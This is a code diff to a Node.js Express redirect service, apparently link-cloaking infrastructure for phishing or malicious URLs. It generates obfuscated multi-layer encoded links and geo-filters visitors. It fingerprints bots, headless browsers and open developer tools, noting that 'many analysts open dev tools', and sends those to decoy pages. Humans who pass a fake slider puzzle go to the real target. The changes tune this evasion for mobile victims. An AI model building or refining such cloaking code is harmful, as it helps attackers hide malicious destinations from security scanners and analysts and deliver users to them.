@@ -25,10 +25,10 @@ const BOT_URLS = [
 
 const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
 const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
-const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country'; // Switched to ipinfo.io
+const GEO_API_URL = process.env.GEO_API_URL || 'https://ipinfo.io/{ip}/country'; // Recommended: add ?token=YOUR_TOKEN in env
 
 const LOG_FILE = 'clicks.log';
-const PORT = process.env.PORT || 10000; // Changed to Render default
+const PORT = process.env.PORT || 10000; // Render default
 
 // ────────────────────────────────────────────────
 // CSP – strict, no external resources
@@ -58,11 +58,19 @@ app.use(express.urlencoded({ extended: true }));
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
 // ────────────────────────────────────────────────
+// MOBILE DETECTION HELPER
+// ────────────────────────────────────────────────
+function isMobile(req) {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  return /android|iphone|ipad|ipod|mobi/i.test(ua);
+}
+
+// ────────────────────────────────────────────────
 // BOT DETECTION – VERY STRONG (server-side)
 // ────────────────────────────────────────────────
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
-  max: 4,
+  max: (req) => isMobile(req) ? 12 : 4, // more requests allowed on mobile
   message: 'Rate limit exceeded',
   standardHeaders: true,
   legacyHeaders: false,
@@ -81,56 +89,53 @@ function isLikelyBot(req) {
 
   let score = 0;
 
-  // Basic UA & header signals
   if (suspiciousUA.some(r => r.test(ua))) score += 35;
   if (!ua.includes('mozilla')) score += 18;
   if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 15;
   if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 12;
   if (!accept.includes('text/html')) score += 12;
 
-  // Missing modern browser security headers (very common in bots 2025–2026)
-  if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) {
-    score += 22;
+  // Relax sec-ch-* penalty on mobile (many Android browsers drop them)
+  if (!isMobile(req)) {
+    if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) {
+      score += 22;
+    }
+    if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) {
+      score += 25;
+    }
   }
-  if (!req.headers['sec-fetch-dest'] || !req.headers['sec-fetch-mode'] || !req.headers['sec-fetch-site']) {
-    score += 25;
-  }
-  if (!req.headers['upgrade-insecure-requests']) score += 14;
 
-  // Suspicious header patterns
+  if (!req.headers['upgrade-insecure-requests']) score += 14;
   if (!req.headers['accept-language'] || req.headers['accept-language'].length < 5) score += 16;
   if (Object.keys(req.headers).length < 10) score += 18;
 
-  // Alphabetical header sorting (many simple bots sort headers)
   const headerKeys = Object.keys(req.headers);
   const sortedKeys = [...headerKeys].sort();
   if (headerKeys.join() === sortedKeys.join()) score += 20;
 
-  console.log(`[BOT CHECK SERVER] ${req.ip} | Score: ${score} | UA: ${ua.substring(0,80)}...`);
+  console.log(`[BOT CHECK SERVER] Mobile=${isMobile(req)} | Score: ${score} | UA: ${ua.substring(0,80)}...`);
 
   return score >= 65;
 }
 
 // ────────────────────────────────────────────────
-// GEO LOCATION CHECK – FIXED FOR RENDER PROXY
+// GEO LOCATION CHECK
 // ────────────────────────────────────────────────
 async function getCountryCode(req) {
-  // Prioritize real client IP from proxy headers
   let forwarded = req.headers['x-forwarded-for'];
   let ip = forwarded ? forwarded.split(',')[0].trim() :
            req.headers['x-real-ip'] ||
            req.ip ||
            'unknown';
 
-  console.log(`[DEBUG-IP] Raw req.ip=${req.ip} | x-forwarded-for=${forwarded || 'missing'} | Chosen IP=${ip}`);
+  console.log(`[DEBUG-IP] Mobile=${isMobile(req)} | Raw req.ip=${req.ip} | x-forwarded-for=${forwarded || 'missing'} | Chosen IP=${ip}`);
 
-  // Skip lookup for localhost / private / reserved ranges
   if (ip === 'unknown' ||
       ip.startsWith('127.') || ip.startsWith('::1') ||
       ip.startsWith('10.') ||
       (ip.startsWith('172.') && parseInt(ip.split('.')[1], 10) >= 16 && parseInt(ip.split('.')[1], 10) <= 31) ||
       ip.startsWith('192.168.')) {
-    console.log(`[DEBUG-GEO] Private/reserved/internal IP detected (${ip}), returning XX`);
+    console.log(`[DEBUG-GEO] Private/reserved IP detected (${ip}), returning XX`);
     return 'XX';
   }
 
@@ -152,14 +157,14 @@ async function getCountryCode(req) {
 }
 
 // ────────────────────────────────────────────────
-// MULTI-LAYER URL ENCODING / DECODING
+// MULTI-LAYER URL ENCODING / DECODING (unchanged)
 // ────────────────────────────────────────────────
 const encoders = [
-  { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
-  { name: 'base64url',  enc: s => Buffer.from(s).toString('base64url'),  dec: s => Buffer.from(s, 'base64url').toString() },
-  { name: 'rot13',      enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
-  { name: 'hex',        enc: s => Buffer.from(s).toString('hex'),        dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'urlencode',  enc: encodeURIComponent,                         dec: decodeURIComponent },
+  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
+  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
+  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
+  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
+  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
 ];
 
 function multiLayerEncode(str) {
@@ -203,7 +208,7 @@ function multiLayerDecode(encoded, layers, noise) {
 }
 
 // ────────────────────────────────────────────────
- // GENERATE TRACKING LINK
+// GENERATE TRACKING LINK (unchanged)
 // ────────────────────────────────────────────────
 app.get('/generate', (req, res) => {
   const target = req.query.target || TARGET_URL;
@@ -234,7 +239,7 @@ app.get('/generate', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// MAIN ROUTE /r/*  – NEUTRAL PAGE + VERY STRONG BOT DETECTION
+// MAIN ROUTE /r/* – OPTIMIZED FOR MOBILE & PC
 // ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
@@ -246,13 +251,13 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   if (ALLOWED_COUNTRIES.length) geoAllowed = ALLOWED_COUNTRIES.includes(country);
   if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
 
-  // TEMP BYPASS - REMOVE AFTER ipinfo.io WORKS
+  // TEMP BYPASS - REMOVE AFTER IPINFO TOKEN SETUP
   if (country === 'XX') {
     console.log('[TEMP] Forcing geo allow - lookup fallback');
     geoAllowed = true;
   }
 
-  console.log(`[DEBUG-GEO-CHECK] Country=${country} | Allowed=${geoAllowed} | Bot=${isLikelyBot(req)}`);
+  console.log(`[DEBUG-GEO-CHECK] Mobile=${isMobile(req)} | Country=${country} | Allowed=${geoAllowed} | Bot=${isLikelyBot(req)}`);
 
   if (!geoAllowed || isLikelyBot(req)) {
     const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
@@ -291,7 +296,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
 
   // ────────────────────────────────────────────────
-  // NEUTRAL VERIFICATION PAGE + AGGRESSIVE CLIENT-SIDE BOT DETECTION
+  // OPTIMIZED VERIFICATION PAGE FOR ANDROID CHROME + PC + iOS
   // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
@@ -330,16 +335,8 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       margin: 0 auto 28px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
-    h2 {
-      margin: 0 0 16px;
-      font-size: 1.65rem;
-      font-weight: 600;
-    }
-    p {
-      margin: 0 0 24px;
-      color: #555;
-      line-height: 1.45;
-    }
+    h2 { margin: 0 0 16px; font-size: 1.65rem; font-weight: 600; }
+    p { margin: 0 0 24px; color: #555; line-height: 1.45; }
     #canvas-container {
       position: relative;
       margin: 28px auto;
@@ -371,17 +368,8 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       box-shadow: 0 3px 10px rgba(0,0,0,0.2);
       transition: left 0.12s;
     }
-    #instructions {
-      font-size: 1rem;
-      color: #444;
-      margin-bottom: 20px;
-    }
-    #error-msg {
-      color: #d32f2f;
-      margin-top: 16px;
-      font-size: 0.95rem;
-      display: none;
-    }
+    #instructions { font-size: 1rem; color: #444; margin-bottom: 20px; }
+    #error-msg { color: #d32f2f; margin-top: 16px; font-size: 0.95rem; display: none; }
     #loading {
       position: absolute;
       inset: 0;
@@ -405,7 +393,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     </div>
 
     <div id="content" style="display:none;">
-      <div id="instructions">Slide the piece into place</div>
+      <div id="instructions">Slide the piece into place (move your finger/mouse first)</div>
       <div id="canvas-container">
         <canvas id="bgCanvas" width="320" height="200"></canvas>
         <canvas id="pieceCanvas" width="320" height="200"></canvas>
@@ -423,30 +411,25 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     const TARGET_URL = '${safeTarget}';
     const BOT_URL    = '${BOT_URLS[0]}';
 
-    // ─── VERY STRONG CLIENT-SIDE BOT / HEADLESS / AUTOMATION DETECTION ───
+    const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
 
-    // 1. Classic headless & automation fingerprints
-    if (
-      navigator.webdriver ||
-      window.outerWidth === 0 ||
-      window.outerHeight === 0 ||
-      navigator.plugins.length === 0 ||
-      navigator.languages.length === 0 ||
-      navigator.hardwareConcurrency === undefined ||
-      navigator.deviceMemory === undefined ||
-      !navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari') ||
-      (navigator.userAgentData && !navigator.userAgentData.platform) ||
-      navigator.maxTouchPoints === undefined
-    ) {
-      location.href = BOT_URL;
+    // ─── CLIENT-SIDE BOT DETECTION – OPTIMIZED FOR ANDROID CHROME ───
+
+    // Skip strict desktop checks on mobile
+    if (!isMobile) {
+      if (navigator.webdriver || window.outerWidth === 0 || window.outerHeight === 0 ||
+          navigator.plugins.length === 0 || navigator.languages.length === 0 ||
+          navigator.hardwareConcurrency === undefined || navigator.deviceMemory === undefined ||
+          navigator.maxTouchPoints === undefined) {
+        location.href = BOT_URL;
+      }
+
+      if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes || !window.chrome.csi) {
+        location.href = BOT_URL;
+      }
     }
 
-    // 2. Incomplete or missing Chrome object (very common in headless Chrome 2025–2026)
-    if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes || !window.chrome.csi) {
-      location.href = BOT_URL;
-    }
-
-    // 3. Canvas fingerprint – detect known bot / headless signatures
+    // Canvas fingerprint – relaxed on mobile
     const testCanvas = document.createElement('canvas');
     const ctx = testCanvas.getContext('2d');
     ctx.textBaseline = 'top';
@@ -460,7 +443,6 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     const canvasData = testCanvas.toDataURL();
 
-    // Known bot / headless canvas patterns (partial – expand during testing)
     const botCanvasPatterns = [
       'iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51',
       'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJ',
@@ -468,34 +450,33 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     ];
 
     if (botCanvasPatterns.some(p => canvasData.includes(p))) {
-      location.href = BOT_URL;
+      if (!isMobile) location.href = BOT_URL; // skip on mobile
     }
 
-    // 4. DevTools / inspector detection (many analysts open dev tools)
-    const devtoolsTrap = /./;
-    devtoolsTrap.toString = function() {
-      entropy -= 40; // heavy penalty
-      return 'devtools detected';
-    };
-    console.log('%c', devtoolsTrap);
+    // DevTools trap – skip on mobile
+    if (!isMobile) {
+      const devtoolsTrap = /./;
+      devtoolsTrap.toString = function() { entropy -= 40; return 'devtools detected'; };
+      console.log('%c', devtoolsTrap);
+    }
 
-    // 5. Unrealistically fast or perfectly linear mouse/touch movement
+    // Fast movement penalty – higher threshold on mobile
     let lastMoveTime = 0;
     document.addEventListener('mousemove', e => {
       const now = Date.now();
-      if (now - lastMoveTime < 5) { // too fast for human
-        entropy -= 15;
+      if (now - lastMoveTime < (isMobile ? 30 : 5)) {
+        entropy -= (isMobile ? 8 : 15); // lower penalty on mobile
       }
       lastMoveTime = now;
     }, {passive: true});
 
-    // ─── Behavioral tracking (tightened for better human vs bot separation) ───
+    // ─── Behavioral tracking – mobile-optimized ───
     let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
     let focusLost = 0;
 
-    const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const minMoves   = mobile ? 6 : 9;
-    const minEntropy = mobile ? 18 : 30;
+    const minMoves   = isMobile ? 3 : 9;     // very low for touch
+    const minEntropy = isMobile ? 8 : 30;    // very low for touch
+    const maxFocusLost = isMobile ? 5 : 2;   // more tab switches ok on phone
 
     function updateEntropy(dx, dy) {
       const now = Date.now();
@@ -516,13 +497,13 @@ app.get('/r/*', strictLimiter, async (req, res) => {
         if (lastX && lastY) updateEntropy(Math.abs(t.clientX - lastX), Math.abs(t.clientY - lastY));
         lastX = t.clientX; lastY = t.clientY;
       }
-    }, {passive:true});
+    }, {passive: true});
 
     document.addEventListener('visibilitychange', () => {
       if (document.hidden) focusLost++;
     });
 
-    // ─── Neutral puzzle logic ───
+    // ─── Puzzle logic (unchanged) ───
     const bg = document.getElementById('bgCanvas').getContext('2d');
     const piece = document.getElementById('pieceCanvas').getContext('2d');
     const knob = document.getElementById('slider-knob');
@@ -584,25 +565,25 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 
     function checkSolve() {
       const dist = Math.abs(puzzleX - targetX);
-      if (dist < 10 && moves >= minMoves && entropy >= minEntropy && focusLost <= 2) {
-        setTimeout(() => location.href = TARGET_URL, 900 + Math.random()*1400);
+      if (dist < 10 && moves >= minMoves && entropy >= minEntropy && focusLost <= maxFocusLost) {
+        setTimeout(() => location.href = TARGET_URL, 1200 + Math.random()*2000);
       } else if (dist < 10) {
         const err = document.getElementById('error-msg');
-        err.textContent = 'Please complete the verification step.';
+        err.textContent = isMobile ? 'Try moving your finger more or sliding slower.' : 'Move your mouse more or slide slower.';
         err.style.display = 'block';
-        setTimeout(() => { err.style.display = 'none'; generatePuzzle(); }, 2200);
+        setTimeout(() => { err.style.display = 'none'; generatePuzzle(); }, 3000);
       }
     }
 
-    // Show puzzle after fake human-like delay
+    // Show puzzle after delay
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('content').style.display = 'block';
       generatePuzzle();
-    }, 2200 + Math.random() * 1800);
+    }, 2500 + Math.random() * 2000);
 
-    // Hard timeout – fail if user takes too long
-    setTimeout(() => location.href = BOT_URL, 45000);
+    // Longer timeout on mobile
+    setTimeout(() => location.href = BOT_URL, isMobile ? 120000 : 45000);
   </script>
 </body>
 </html>
